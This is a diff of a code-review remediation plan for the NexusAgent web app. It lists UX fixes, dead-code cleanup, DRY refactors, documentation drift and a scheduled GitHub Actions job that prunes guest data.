+- **Where:** `workspace-sidebar.tsx` (badge `v2`, title "MCP Protocol"), `public/site.webmanifest` and `app/layout.tsx` description ("MCP v2"), `observability-panel.tsx` ("LangGraph DAG Pipeline", "Execution Wire Logs", "Wire"), `McpInspector.tsx` ("Raw Wire"), backend router tag "Model Context Protocol (MCP v2)".
+- **Problem:** The server speaks MCP protocol version `2024-11-05`; "v2" is not a real version and misleads integrators. The panel names are fine for a developer showcase but confusing for others.
+- **Fix:** Replace the `v2` badge with the real protocol date, remove "MCP v2" from the manifest/metadata/router tag (say "Model Context Protocol"). Rename user-visible labels: "Pipeline", "Run log", "Raw messages". Keep the observability panel itself.
+- **Verify:** Update tests that assert on the old strings.
 
-### UX-06 · Medium · Hand-rolled Markdown parser (KISS)
+### R2-UX-07 · Low · Arbitrary pixel values violate the project's own rule
 
-- **Where:** `apps/frontend/components/canvas/MarkdownRenderer.tsx` (534 lines).
-- **Problem:** The custom line parser has no italics, no nested lists, no ordered-list continuation across blank lines, no inline links without a scheme, and fragile table detection. It re-parses the whole document on every token. LLM output uses all of these features.
-- **Fix:** Replace the parser with `react-markdown` + `remark-gfm`. Do not use `rehype-raw`, so raw HTML stays escaped. Keep custom `components` overrides for `code` (Mermaid and `CodeBlock`), `table` (`TableBlock`), `blockquote` (callouts), `a` (http/https only, `rel="noopener noreferrer"`), and a text transformer for `[S1]` citation labels (LOG-05). This deletes about 350 lines.
-- **Verify:** Existing `MarkdownRenderer.test.tsx` cases still pass, plus new ones for `*italic*` and nested lists.
+- **Where:** `.agents/specs/AGENTs.md` §4 forbids "arbitrary hardcoded pixel widths". Found: `min-w-[70px]` (page.tsx), `w-[1px]`, `min-h-[300px]`, `min-h-[220px] max-h-[480px]` (MermaidViewer), `max-h-[340px]` (observability-panel), `sm:max-w-[480px]`, `sm:text-[13px]`, `max-w-[220px] sm:max-w-[260px]` (sign-in-dialog), `min-h-[44px]`/`min-h-[36px]`/`min-h-[48px]` (button, dialog, switch), `max-h-[80vh]`/`[85vh]`.
+- **Fix:** Replace with Tailwind scale utilities (`min-w-18`, `w-px`, `min-h-72`, `max-h-80`, `sm:max-w-md`, `text-xs`, `min-h-11`, `min-h-9`, `min-h-12`, `max-h-[80dvh]` -> `max-h-4/5` or a token). For heights that need `vh`, define a `--spacing-*`/`--height-*` token in `@theme`.
+- **Verify:** `grep -rnE "\[[0-9.]+(px|vh|rem)\]" apps/frontend/components apps/frontend/app --include=*.tsx` returns nothing (ignore tests). Visual spot check.
 
-### UX-07 · Low · Floating "New Chat" button overlaps content
+### R2-UX-08 · Low · Theme toggle performs side effects inside a state updater
 
-- **Where:** `apps/frontend/components/chat-canvas.tsx:69-82`.
-- **Problem:** The button is `absolute top-4 right-4 z-20` over the scrolling thread, so it covers the top-right of messages and tables.
-- **Fix:** Put it in a slim sticky toolbar row above the thread (`sticky top-0` with a `bg-background/90` backdrop), or in the header next to the theme toggle.
-- **Verify:** Visual check with a wide table at the top of the thread.
+- **Where:** `apps/frontend/app/page.tsx::handleToggleTheme`.
+- **Problem:** `setIsDarkTheme((prev) => { ...document.documentElement.classList..., localStorage.setItem(...) })` runs side effects in an updater. React may call updaters twice (StrictMode) and the React Compiler assumes purity. Also `localStorage.setItem` is not in a `try/catch` (throws in private mode).
+- **Fix:** Compute `next` from the current state outside the updater, call `setIsDarkTheme(next)`, and apply the DOM class and storage write in a `useEffect([isDarkTheme])` with a `try/catch`. Skip the first run so the inline script's value is not overwritten before `isDarkTheme` is read from the DOM.
+- **Verify:** Toggle test checks the class and storage; storage failure does not throw.
 
-### UX-08 · Low · Internal jargon in end-user UI
+### R2-UX-09 · Low · Chat search is title-only on the client while the server search is unused
 
-- **Where:** `chat-canvas.tsx:179` ("Executing DAG [PLANNER]..."), `McpInspector.tsx:119,221` ("MCP v2", "RPC 200 OK"), `observability-panel.tsx:157` ("Critic Soundness"), `sign-in-dialog.tsx:94` ("5 live LLM quota gift").
-- **Problem:** "MCP v2" is not a protocol name (the implementation speaks MCP `2024-11-05`). "RPC 200 OK" mixes HTTP and JSON-RPC. Loading text exposes node names.
-- **Fix:** Use plain status text: "Searching sources…", "Writing answer…" (map from `currentNode`); "MCP (2024-11-05)"; "Success"/"Error"; "You get 5 free questions per hour." Keep raw node names only in the observability panel.
-- **Verify:** `grep -rn "MCP v2\|RPC 200 OK\|quota gift" apps/frontend` returns 0.
-
-### UX-09 · Low · MCP Inspector asks for a token users cannot get
-
-- **Where:** `apps/frontend/components/mcp/McpInspector.tsx:239-257`.
-- **Problem:** It tells external-client users to add `Authorization: Bearer`, but there is no UI to copy a token. It also renders for signed-out users, and Invoke then fails with an HTTP 401.
-- **Fix:** If `!authToken`, show "Sign in to try MCP tools" with the sign-in button. For signed-in users, add a "Copy access token (expires in 24 h)" button next to the endpoint, with a warning not to share it. Alternatively, if external MCP use is not a goal, remove the external-client tip (YAGNI).
-- **Verify:** Component test for the signed-out state.
-
-### UX-10 · Low · Two fetch layers (DRY)
-
-- **Where:** `apps/frontend/app/page.tsx:139-158,174-203`; `apps/frontend/components/mcp/McpInspector.tsx:79-110`; `apps/frontend/hooks/useAgentStream.ts:104-113`.
-- **Problem:** Document list, upload, MCP calls and the stream use raw `fetch` with hand-built headers. A 401 there does not log the user out, error messages differ, and the token is passed around as a prop.
-- **Fix:** Use `apiClient` for the docs list, upload and MCP (it already handles `FormData`). For the stream, read the token through the same getter and call the registered unauthorized callback on 401. Remove the `token`/`authToken`/`apiBase` props from `WorkspaceSidebar`, `McpInspector` and `StreamParams`.
-- **Verify:** Tests: a 401 from upload triggers logout.
-
-### UX-11 · Low · Reloaded conversations lose citations
-
-- **Where:** `apps/backend/app/routes/agent.py:228-238`; `apps/frontend/hooks/useChatHistory.ts:137-153`.
-- **Problem:** Citations are not persisted, so an old answer re-renders without pills and without the citation tray.
-- **Fix:** Save `citations` (wire form) inside `reflection_summary` (or a new `citations JSONB` column in a new migration) and map them back in `handleSelectConversation`.
-- **Verify:** Reload a conversation; the citation tray renders.
-
-### UX-12 · Low · Composer auto-grow not cross-browser
-
-- **Where:** `apps/frontend/components/composer.tsx:34` (`[field-sizing:content]`).
-- **Problem:** `field-sizing` is not supported in Firefox or older Safari, so the textarea stays one row there.
-- **Fix:** Add a fallback: in `onChange`, set `el.style.height = 'auto'; el.style.height = Math.min(el.scrollHeight, 160) + 'px'`.
-- **Verify:** Manual check in Firefox.
+- **Where:** `SidebarChatHistory.tsx` (filters `title`/`lastSnippet` locally), `routes/chat.py` `q` parameter and `neon.list_conversations(search_term)`.
+- **Problem:** Two search implementations; the server one (`ILIKE` over every message, no wildcard escaping, no index) is never called, and the client one cannot find text inside answers.
+- **Fix:** See R2-CLN-01: delete the server-side `q`. Keep the client filter and update its placeholder to "Search titles...".
+- **Verify:** `SidebarChatHistory.test.tsx` placeholder assertion updated.
 
 ---
 
-## 5. Cleanup: dead, unused and redundant code (YAGNI / DRY / KISS)
+## 5. Cleanup: dead, unused and redundant code (YAGNI / DRY / KISS / SOLID)
 
-Delete these in the order listed. Every item was checked with `grep` across `apps/`, `scripts/` and `packages/`; "used only by tests" means the tests must be updated or deleted too.
+### R2-CLN-01 · Medium · Backend dead and redundant code
 
-### CLN-01 · Unused DB methods (`apps/backend/app/db/neon.py`)
+Do these as one commit per bullet group, running the gates each time.
 
-| Symbol                                                        | Status                                          | Action                                                                                                  |
-| ------------------------------------------------------------- | ----------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
-| `execute_migration` (`:59-63`)                                | unused                                          | delete                                                                                                  |
-| `fetchrow` (`:71-75`)                                         | unused                                          | delete                                                                                                  |
-| `create_document` (`:319-340`)                                | tests only                                      | delete; tests use `create_document_with_chunks`                                                         |
-| `insert_document_chunks` (`:342-365`)                         | tests only                                      | delete; same as above                                                                                   |
-| `get_document_by_hash` no-`user_id` branch (`:385-389`)       | unreachable                                     | make `user_id` required, delete branch                                                                  |
-| `get_conversation` + `get_conversation_messages` (`:535-628`) | duplicate of `get_conversation_with_messages`   | `agent.py:315-318` switches to `get_conversation_with_messages` (with `LIMIT`, see LOG-11); delete both |
-| `get_seeded_documents` (`:260-266`)                           | duplicate of `list_all_documents(user_id=None)` | `/chat/documents` uses `list_all_documents`; delete                                                     |
-| `save_message`                                                | replaced by `save_turn` (LOG-18)                | delete                                                                                                  |
+- **Unused search feature:** delete `q` from `routes/chat.py::list_chat_history`, `search_term` from `NeonDatabase.list_conversations` and its `ILIKE`/`EXISTS` SQL (also removes an unescaped-wildcard and sequential-scan risk). Keep `limit`. Update `test_chat_history.py`.
+- **`AgentGraph.__init__(db=...)`:** `self.db` is never used. Remove the parameter and attribute and the `NeonDatabase`/`neon_db` imports in `agent/graph.py` if they become unused.
+- **`RateLimitBucket.client_ip`:** the table has no `client_ip` column and nothing reads the field. Remove it (the model ignores extra DB columns such as `id`, so nothing else changes).
+- **`TokenBucketLimiter.refund(is_guest)`** parameter (handled in R2-LOG-01) and `check_and_consume(client_ip)` stays.
+- **`DocumentChunk.convert_vector_to_list`:** the `to_numpy` branch is unreachable, and `neon.get_document_chunks` re-implements the same conversion (removed by R2-LOG-04). Keep only the `tolist` and iterable cases.
+- **`hybrid_search.compute_rrf`:** (a) the dense and sparse loops are copy-pasted; make one helper `_accumulate(scores, items, weight, rank_key, score_field, score_key)`. (b) the metadata aliases `header_path`/`headerPath` and `start_line`/`startLine`: the parser only writes camelCase (`headerPath`, `startLine`, `endLine`), so drop the snake_case fallbacks. (c) move `import json` to module level. (d) the default weights `0.5/0.5/60` are repeated in `compute_rrf`, `HybridSearchEngine.search`, `HybridSearchRequestWire` and `retriever_node` (0.6/0.4/60): define `DEFAULT_DENSE_WEIGHT`, `DEFAULT_SPARSE_WEIGHT`, `DEFAULT_RRF_K` once in `hybrid_search.py` and reuse.
+- **`routes/chat.py`:** the module docstring still mentions the removed "seeded knowledge-base listing". The `hasattr(x, "isoformat")` branches in `conversation_to_wire`, `message_to_wire`, and `routes/documents.py::document_to_wire`/`chunk_to_wire` are dead (asyncpg always returns `datetime`); replace with `.isoformat()`. `get_chat_conversation` hand-builds a conversation dict instead of calling `conversation_to_wire` and omits `updatedAt`: call the shared function (fetch `updated_at` in `get_conversation_with_messages`).
+- **`total` in `ChatHistoryResponseWire`** equals `len(conversations)` and is misleading (not a total count). Remove the field (and from the contract), or compute a real `COUNT(*)`. Prefer removal (YAGNI).
+- **JWT claims `role` and `is_guest`** in `session_claims` are never read by the server (it reloads the user). Remove them; keep `sub`, `tv`, `auth_time`.
+- **`get_current_user`/`refresh_token`** decode the token twice (see R2-LOG-11).
+- **`hash_device_id` docstring** says "constant-time"; a plain SHA-256 is not a constant-time operation. Fix the docstring.
+- **`Settings.KNOWLEDGE_BASE_DIR`** duplicates the module constant `KNOWLEDGE_BASE_DIR`; keep one (the module constant, used by the MCP registry).
+- **Unused `__init__` re-exports:** `app/agent/__init__.py` and `app/mcp/__init__.py` export names nobody imports through the package. Reduce them to docstrings.
+- **`numpy` is declared as a direct dependency** but only tests import it and `pgvector` already depends on it. Run `uv tree --invert --package numpy`; if `pgvector` pulls it, remove it from `[project].dependencies` and add it to the `dev` group.
+- **`mcp/dispatch.py::dispatch_mcp_method`:** `elif` chain after `return`s; use early returns or a dict of handlers. (Do this only together with R2-LOG-12 to keep the diff reviewable.)
+- **`mcp.py::mcp_messages_endpoint`:** the same "put on queue or raise 429" block appears three times, and the `HTTPException` raised inside `try` is caught by the broad `except Exception`. Extract `_enqueue(queue, response)` that raises 429, call it outside the `try`.
+- **Verify:** all gates; `ruff` reports no unused imports; grep shows no remaining references to deleted names.
 
-### CLN-02 · In-memory fallbacks that authenticated requests can never reach (KISS)
+### R2-CLN-02 · Low · Frontend dead code and unused exports
 
-- **Where:** `apps/backend/app/core/rate_limiter.py:22-28,63-94,139-149,173-174,190-193`; `apps/backend/app/core/audit_log.py:20-21,53-54,94-102,151`.
-- **Why:** Every route that uses them first runs `get_current_user`, which needs the DB (LOG-19). The fallbacks only make sense if the DB fails _between_ the auth lookup and the quota call, and in that case a per-process bucket silently resets on restart. The audit ring also keeps every user's queries in process memory.
-- **Action:** Delete `MemoryBucket`, `_memory_buckets` and `_get_memory_bucket`, and the DB-error fallback branches (raise `DatabaseUnavailable` instead). Delete the audit `_memory_audit_logs` ring and `get_recent_audit_logs`; on write failure, log at error level (already done). Update `reset_for_test` and the tests (`test_security_hitl.py::test_audit_logs_per_user_isolation_in_memory`, `test_token_bucket_rate_limiter_depletion`) to use the DB or mocks.
+- `apiClient` option `params` (≈12 lines building a `URL`) is never passed by any caller. Delete it and the `ApiClientOptions.params` field (keep `timeoutMs`).
+- `useAgentStream` returns `streamError` (unused by `page.tsx`) and accepts `documentId` (never passed). Remove both unless **D4** adds a document selector. Remove the unused `AgentRunResult` re-wrapping if it ends up trivial.
+- `useChatHistory` returns `setChatNotice`, `loadConversations` that `page.tsx` never uses (note: R2-LOG-07 starts using `setChatNotice`). `handleSelectConversation` has an unused `_title` parameter; remove it.
+- Unused primitives in `components/ui`: `CardFooter`, `DialogFooter`, `DialogClose`, `PopoverAnchor`; unused variants: Button `destructive`, `link`, size `lg`; Badge `default`, `secondary`, `success`, `warning`, `destructive`. Verify each with `grep` first, then delete. (Low value; skip any that a planned change will use.)
+- Unused CSS tokens in `styles/globals.css` and the `@theme` block: `--dark-pill*`, `--info*`.
+- `apps/frontend/.gitignore` contains only `.vitest/`, which the root `.gitignore` already ignores. Delete the file.
+- `packages/contracts/package.json` declares `main`/`exports` to `dist/` and a `build` script, but the frontend resolves the package through the `tsconfig` `paths` alias to `src/` and only imports types. CI's `pnpm --filter @nexusagent/contracts build` step is therefore unnecessary. Remove that CI step (R2-OPS-04) and keep `typecheck`.
+- **Verify:** typecheck, lint (the unused-export rule), tests.
 
-### CLN-03 · Backwards-compatibility aliases for removed HITL
+### R2-CLN-03 · Medium · Hand-written wire mappers (DRY)
 
-- **Where:** `apps/backend/app/core/audit_log.py:155-157` (`HitlCoordinator`, `default_hitl_coordinator`).
-- **Action:** Delete. No references remain.
+- **Where:** `routes/agent.py` (`plan_step_to_wire`, `citation_to_wire`, `warning_to_wire`), `routes/documents.py` (`document_to_wire`, `chunk_to_wire`), `routes/chat.py` (`conversation_to_wire`, `message_to_wire`), `routes/rag.py` (a 14-field copy of `HybridSearchResult` into `HybridSearchResultWire`), `routes/auth.py::user_to_session`.
+- **Problem:** Seven mappers re-type the same snake_case -> camelCase conversion, and `HybridSearchResultWire` duplicates `HybridSearchResult`. Each new field needs edits in three places.
+- **Fix:** In `db/models.py` add
+    ```python
+    from pydantic.alias_generators import to_camel
+    class WireModel(BaseModel):
+        model_config = ConfigDict(alias_generator=to_camel, populate_by_name=True, from_attributes=True)
+    ```
+    Make the `*Wire` classes inherit from it with snake_case field names, return model instances (FastAPI serialises with aliases by default), and delete the mapper functions. Do it one router at a time (agent SSE, documents, chat, rag, auth), running `pnpm contracts:generate` after each and checking that `git diff packages/contracts` is empty (the generated TypeScript must not change). For the SSE models call `model_dump_json(by_alias=True)`.
+- **Verify:** Contracts diff is empty; all existing route tests pass unchanged.
 
-### CLN-04 · MCP "tool poisoning" and "rug-pull" checks against our own constants
+### R2-CLN-04 · Low · Message cache logic duplicated in four places
 
-- **Where:** `apps/backend/app/core/security_guardrails.py:189-274`; `apps/backend/app/mcp/registry.py:14,49-52,72-107,156-162`; tests `test_security_hitl.py::test_mcp_tool_poisoning_detection`, `::test_mcp_registry_blocks_tampered_rug_pull`.
-- **Why:** These checks are meant for tool definitions received _from third-party MCP servers_. NexusAgent has no MCP client. `PINNED_TOOL_HASHES` is computed at import time from the same `TOOLS` constant it is later compared against, so it can never fail at runtime. This is security theatre, and it adds a `schemaHash` field that is not part of the MCP spec.
-- **Action:** Delete `MCP_POISONING_PATTERNS`, `scan_mcp_tool_metadata`, `compute_mcp_tool_hash`, `PINNED_TOOL_HASHES`, `validate_tool_integrity` and the `schemaHash` field, plus their tests. Note in `ARCHITECTURE.md §10.8` that these controls apply when an MCP client is built.
+- **Where:** `app/page.tsx::streamInto` (writes `nexusagent_msgs_*` with fake `createdAt: new Date()` and without warnings), `useChatHistory.ts` (`prefetchMessages`, `handleSelectConversationItem`, `handleDeleteConversation`), `auth-store.ts` (`CHAT_CACHE_PREFIXES`).
+- **Fix:** Create `lib/chat-cache.ts` exporting `readMessages(id)`, `writeMessages(id, records)`, `removeMessages(id)`, `readConversations(userId)`, `writeConversations(userId, list)`, `clearChatCache()`, each wrapping `localStorage` in `try/catch`. Use them from the hook and the store. `page.tsx` must stop writing to localStorage: after a stream completes, call `prefetchMessages` with a forced refresh (or invalidate the memory cache entry) so the next open fetches the server copy with real timestamps.
+- **Verify:** Unit test for `chat-cache`; `grep -rn "nexusagent_msgs_" apps/frontend --include=*.ts --include=*.tsx` only matches `lib/chat-cache.ts`.
 
-### CLN-05 · Unused agent state and recursion config
+### R2-CLN-05 · Low · Graph topology duplicated in `routes/agent.py`
 
-- **Where:** `apps/backend/app/agent/state.py:50,63-69,73-74` (`max_history_turns`, `reflection_score`, `reflection_feedback`, `needs_replan`, `iteration_count`, `max_iterations`, `injection_*`); `apps/backend/app/agent/graph.py:535-538` (`_run_config`, "cyclical reflection" comment on a graph with no cycles).
-- **Action:** Remove together with LOG-06, SEC-07 and LOG-11. The graph uses LangGraph's default recursion limit.
+- **Where:** `routes/agent.py::next_node` hard-codes `{"retriever": "grounding", "grounding": "synthesizer"}` and calls `route_after_planner`; `agent/graph.py::_build_graph` defines the same edges.
+- **Problem:** Adding a node requires editing both; they can silently disagree.
+- **Fix:** In `graph.py` define `PIPELINE_NEXT = {"retriever": "grounding", "grounding": "synthesizer"}` and `def next_node(finished, state)` there, use it in `_build_graph` (`add_edge` loop) and import it in `routes/agent.py`. Delete the copy.
+- **Verify:** `test_agent_dag.py` still asserts the `node_start` order for greeting, out-of-scope and architectural queries.
 
-### CLN-06 · Unused schema columns and settings
+### R2-CLN-06 · Medium · `generate_agent_stream` and route-to-route imports violate SRP/DIP
 
-- `users.hashed_password` and `User.hashed_password`: password auth was removed (`TODOs.md:33`). New migration `ALTER TABLE users DROP COLUMN hashed_password;` and drop the field and the `INSERT`/`RETURNING` lists in `neon.py`.
-- `documents.storage_path`: written only by the seed script, never read. Drop the column (new migration), the `Document`/wire fields and the contract field.
-- `Settings.DATABASE_URL` (`config.py:41`): a duplicate of `NEON_DATABASE_URL`. Keep one (`DATABASE_URL` is the more conventional name) and update `.env.example`, `conftest.py` and the scripts.
-- `GUEST_TOKEN_EXPIRE_MINUTES` versus `ACCESS_TOKEN_EXPIRE_MINUTES`: both default to 24 h. Keep both only if they differ (see SEC-04); otherwise keep one.
-- `GEMINI_MODELS` fallback inside `_get_llm_chain` (`graph.py:344-346`) repeats the setting's default. Delete the `getattr` and fallback.
+- **Where:** `routes/agent.py::generate_agent_stream` (≈180 lines: builds state, formats SSE, runs the graph, refunds quota, persists, handles cancellation, all in nested closures); `routes/agent.py` and `routes/rag.py` import `require_document_access` from `routes/documents.py`.
+- **Problem:** One function has six reasons to change and is hard to test; routers depend on each other instead of on a shared layer.
+- **Fix:** (1) Move `require_document_access` to `app/core/access.py` and import it from there in the three routers. (2) Move `persist_turn` and the title rule (`TITLE_MAX_CHARS`) to `app/services/conversations.py`. (3) Split `generate_agent_stream` into: `sse.py` (`format_sse` and the node->event mapping, one function per node), `AgentRun` (a small class holding `tokens_sent`, `refund_if_charged`, `run()`), and the thin generator. Behaviour must not change; do this refactor **after** R2-SEC-03, R2-LOG-02 and R2-LOG-07 so those diffs stay small.
+- **Verify:** `test_agent_stream.py`, `test_agent_dag.py` and the security tests pass unchanged.
 
-### CLN-07 · Endpoints with no consumer (YAGNI)
+### R2-CLN-07 · Low · `parser.py` duplicated chunk construction and double search
 
-| Endpoint                         | Consumer                                                  | Action                                                                                                                                                                                                             |
-| -------------------------------- | --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| `GET /api/chat/documents`        | used for signed-out users only                            | Keep **one** document list: make `GET /api/documents` work without auth (seeded only) via `get_current_user_optional`; delete `/chat/documents`; drop the snake/camel `normalizeDoc` fallbacks in `page.tsx:23-30` |
-| `POST /api/chat/history`         | tests only (conversations are created by `/agent/stream`) | delete route and its test step                                                                                                                                                                                     |
-| `GET /api/mcp/sse?once=true`     | test hook in a production route                           | delete `once`; test the endpoint event with a streaming client that closes after the first event                                                                                                                   |
-| `GET /api/documents/{id}/chunks` | none today                                                | **keep** and use it for UX-05; delete only if UX-05 is rejected                                                                                                                                                    |
-| `POST /api/rag/search`           | none in UI (MCP covers it)                                | optional: keep as public API; it is metered                                                                                                                                                                        |
+- **Where:** `apps/backend/app/rag/parser.py::parse_markdown` (the `if nodes:` and `else:` branches build identical `meta`/`DocumentChunk` code), `_locate` (calls `find_chunk_start` and then `compute_line_positions`, which calls it again).
+- **Fix:** Extract `_make_chunk(document_id, index, text, headers, start, end, extra)`; make the fallback branch produce `[(text, [])]` pairs and feed one loop. Make `compute_line_positions` accept the already-found index (or return `(start, end, idx)`) so the search runs once per chunk. Behaviour and metadata keys must stay identical.
+- **Verify:** `test_documents.py` parser tests unchanged and green.
 
-### CLN-08 · Frontend dead code
+### R2-CLN-08 · Low · Placeholder scaffolding files with `TODO` content
 
-- `components/ui/input.tsx`: never imported. Delete.
-- `CardFooter`, `DialogFooter`, `DialogClose`, `PopoverAnchor` exports: unused. They are standard shadcn exports; deleting them is optional (low value).
-- `HireMeModal` `trigger` prop and `DialogTrigger` branch (`hire-me-modal.tsx:10,22`): unused. Delete.
-- `ObservabilityPanel` `isOpen` prop (`observability-panel.tsx:34`): never read. Delete. Also remove the dead `lg:w-80` class (the panel is hidden below `xl`).
-- `LogEntry.meta`: never set by any caller. Delete.
-- `McpToolOption` type export and `MCP_TOOLS` array with a single item (`McpInspector.tsx:10-24`): inline the one tool.
-- `ChatItem.citations?: any[]` → `Citation[]`; `scrollContainerRef as any`, `fileInputRef as any`: fix the types.
-- `auth-store.ts:73-74,193-194`: leftover removal of `nexusagent_byok_*` keys from the removed BYOK feature. Delete after one release.
-- Duplicate comment line `MermaidViewer.tsx:9-10`. Delete one.
-- `packages/contracts/src/documents.ts` is never imported. Either use it (`WorkspaceDoc` → `DocumentMetadata`, upload response typing) or delete it. Recommended: use it.
-- `apiClient` `params` option: unused outside its test. Keep (cheap) or delete (YAGNI); low priority.
-- One `TooltipProvider` per `CitationPill`: move a single provider to `layout.tsx` or `page.tsx`.
+- **Where:** `.agents/rules/00-identity.md`, `01-guide.md`, `02-standard.md`, `.agents/logs.md`, `.agents/context/README.md`, `.agents/context/decisions.jsonl` (empty), `.agents/skills/decision-layer/.gitkeep`, `.agents/skills/remotion/.gitkeep`, `.agents/specs/aim.md`, `.agents/specs/versions.md`.
+- **Problem:** Eleven files whose entire content is "TODO: ..." or empty. They mislead readers and contradict the project's own "no phantom implementations" rule. `README.md` advertises them in the tree.
+- **Fix:** Delete the files and folders above (except keep `.agents/specs/*.md` that have content). Update the `README.md` "Monorepo Architecture" tree and the "Master Documentation Index" accordingly. Do **not** delete `.agents/specs/AGENTs.md`, `architecture.md`, `design.md`, `features.md`. See **D5** if the owner wants to keep any as real documents.
+- **Verify:** `git ls-files .agents` lists only the four real specs; README has no dead links (`grep -n "\.agents" README.md`).
 
-### CLN-09 · Self-testing tests
+### R2-CLN-09 · Low · MCP resource table duplicated and incomplete
 
-- **Where:** `apps/backend/tests/test_hybrid_search.py:20-65` (`generate_deterministic_embedding`, `test_embedding_generation_dimension_and_norm`, `test_embedding_determinism`).
-- **Why:** They test a helper defined inside the test file, not product code.
-- **Action:** Delete the helper and both tests. If the helper is used to build fixtures in db tests, keep it as a fixture without its own tests.
+- **Where:** `app/mcp/registry.py`: `STATIC_RESOURCES` and the `filename_map` inside `read_resource`.
+- **Problem:** URIs are listed twice (drift risk) and only 2 of the 4 knowledge-base files are exposed (`artificial_analysis.md` and `openrouter_metrics.md` are searchable but not readable as resources).
+- **Fix:** One table: `RESOURCES = [(ResourceDefinition(...), "benchlm_evals.md"), ...]`, built from the four files in `knowledge_base/benchmarks/`; `get_resources()` and `read_resource()` both derive from it. Add `benchmark://artificial-analysis` and `benchmark://openrouter-metrics`. Read the file with `asyncio.to_thread` so the event loop is not blocked.
+- **Verify:** `test_mcp.py`: `resources/list` returns 4 entries and `resources/read` returns the content for each.
 
-### CLN-10 · Repo-level clutter
+### R2-CLN-10 · Low · `seed_kb.py` duplicates the document insert SQL
 
-- `package.json:8-17`: duplicate script aliases (`dev:fe`/`dev:frontend`, `dev:be`/`dev:backend`, `test:fe`/`test:frontend`, `test:be`/`test:backend`). Keep one set.
-- `.gitignore:57-61`: `.freebuff`, `apps/frontend/AGENTS.md` and `apps/frontend/CLAUDE.md` are personal tool artefacts. Move them to `.git/info/exclude`.
-- `.agents/rules/adhd.md`, `caveman.md`, `ponytail.md`: AI assistant output-style rules, not product files. `ponytail.md` forbids third-party UI libraries ("native `<dialog>` … strictly forbidden from installing third-party tools"), which contradicts `DESIGN.md`/`AGENTs.md` (shadcn/ui + Radix are mandated). Delete the folder, or move it to the user's global agent config. If kept, remove the contradiction.
-
-### CLN-11 · Duplicated constants across the stack (DRY)
-
-- Quota numbers `5`/`25` are hard-coded in `auth-store.ts:53-54,88,100,164-165,203-204`, `sign-in-dialog.tsx:51,94`, `terms/page.tsx` and `models.py:33-34,123-124`. The server already returns `bucketCapacity`. Use it, and default to `null` ("—") until known.
-- Upload limit `5 MB` appears in `page.tsx:20`, `workspace-sidebar.tsx:219` and `documents.py:33`. Expose `maxUploadBytes` from a small `GET /api/config` (or put it in the 413 body) and read it once.
-- `"http://localhost:8000"` appears in `api-client.ts:1` and `McpInspector.tsx:31`. Use `API_BASE` only. In production builds, fail the build if `NEXT_PUBLIC_API_URL` is missing (check in `next.config.ts`).
-- The domain `nexusagent.avinaba.com` is hard-coded in `workspace-sidebar.tsx:315`, the legal pages and `config.py:23`. Move it to `NEXT_PUBLIC_SITE_HOST`.
-
-### CLN-12 · Contracts duplicated by hand (DRY)
-
-- **Where:** `packages/contracts/src/*.ts` versus the Pydantic wire models in `apps/backend/app/db/models.py:78-151`, `routes/rag.py`, `routes/agent.py` (dict literals), and `routes/chat.py` (dict literals).
-- **Problem:** The two sides already drift. `AgentInvokeResponse.createdAt` is never sent. `/chat/documents` returns snake_case. SSE payloads are untyped dicts.
-- **Action:** Give every route a Pydantic `response_model` (including SSE event payload models), then generate TS types from `/openapi.json` with `openapi-typescript` into `packages/contracts/src/generated.ts`. Re-export the needed names and delete the hand-written duplicates. Add a CI check that regenerating produces no diff.
+- **Where:** `scripts/seed_kb.py` (hand-written `INSERT INTO documents` / `document_chunks`), `app/db/neon.py::create_document_with_chunks`.
+- **Fix:** Add `NeonDatabase.replace_seeded_documents(items: list[tuple[Document, list[DocumentChunk]]])` that does the whole transactional upsert (with the stable ids from R2-LOG-05), and make the script call it. Remove the SQL strings from the script.
+- **Verify:** Run the script against a test database (or a `db` test) twice; counts are stable.
 
 ---
 
-## 6. Documentation and spec drift
+## 6. Operations, CI, documentation and tests
 
-`AGENTs.md` says the `target/` docs are the source of truth and forbids marking unbuilt work as done. Today they describe a different system.
+### R2-OPS-01 · Medium · Retention job (privacy promise) is not scheduled
 
-### DOC-01 · `TODOs.md` marks non-existent work as done
+- **Where:** `scripts/prune_guests.py`, `README.md` ("run daily (cron, Render Cron Job, or a scheduled CI job)"), `apps/frontend/app/privacy/page.tsx` ("Inactive guest accounts and their documents are deleted after 24 hours", "Tool audit records are deleted after 30 days").
+- **Problem:** The policy states a guarantee; nothing in the repository runs the job. Until someone sets up a cron, guest data and audit rows (which contain user query text) are kept forever.
+- **Fix:** Add `.github/workflows/maintenance.yml`:
 
-| Line   | Claim (checked `[x]`)                                       | Reality                                            |
-| ------ | ----------------------------------------------------------- | -------------------------------------------------- |
-| 63     | Critic "with loop-back condition (capped at 10 iterations)" | Straight-line graph, no loop (LOG-06)              |
-| 70     | Streams `tool_call` events                                  | Never emitted                                      |
-| 77     | "Markdown renderer with code syntax highlighting"           | No highlighting                                    |
-| 79     | "Citation Pills with line jump"                             | Click only highlights a filename (UX-05)           |
-| 111    | "unresolved approvals fail closed on timeout"               | HITL was removed                                   |
-| 118    | BYOK `validate_byok_key`                                    | BYOK removed in `dd0f7c5`; function does not exist |
-| 122    | Injection "surfaces an observability warning"               | Not surfaced (SEC-07)                              |
-| 15–132 | Phases 3, 10, 11, 12, 13 headed `[Completed]`               | Each has unchecked items                           |
+    ```yaml
+    name: Maintenance
+    on:
+        schedule:
+            - cron: '17 3 * * *'
+        workflow_dispatch:
+    permissions:
+        contents: read
+    jobs:
+        prune:
+            runs-on: ubuntu-latest
+            steps:
+                - uses: actions/checkout@v4
+                - uses: astral-sh/setup-uv@v5
+                - run: uv sync --frozen --project apps/backend
+                - run: uv run --project apps/backend python scripts/prune_guests.py
+                  env:
+                      ENVIRONMENT: production
+                      NEON_DATABASE_URL: ${{ secrets.NEON_DATABASE_URL }}
+                      JWT_SECRET_KEY: ${{ secrets.JWT_SECRET_KEY }}
+                      GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
+    ```
 
-**Fix:** Uncheck or delete the false items, change phase headers to `[Partial]` where items remain open, and add a "Removed" note where a feature was intentionally dropped (as already done for Phase 6).
+    (The script imports `app.config`, which refuses to start in production without those values. Alternatively set `ENVIRONMENT=development` for this job and pass only `NEON_DATABASE_URL`.) Pin action versions per R2-OPS-04. Add the same to the README "Maintenance" section. Add the cleanup of `ip_rate_events` if R2-SEC-06 (DB option) is done.
 
-### DOC-02 · `AGENTs.md` invariants that the code does not follow
